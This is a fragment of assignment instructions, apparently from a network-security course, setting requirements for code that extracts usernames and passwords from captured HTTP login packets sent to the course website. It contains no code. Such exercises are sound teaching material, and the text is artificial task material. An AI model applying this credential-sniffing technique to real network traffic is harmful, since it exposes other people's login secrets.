    1. You can assume the entire HTTP request fits within one packet, and that
       both the username and password are non-empty for login requests (if any
       of the above assumptions fails, it's OK if you don't extract the
       user/password - but you must still NOT crash).
    2. Filter the course website using the `WEBSITE` constant from above. DO NOT
       use the server IP for the filtering (as our domain may point to different
       IPs later and your code should be reliable).
    3. Make sure you return a tuple, not a list.
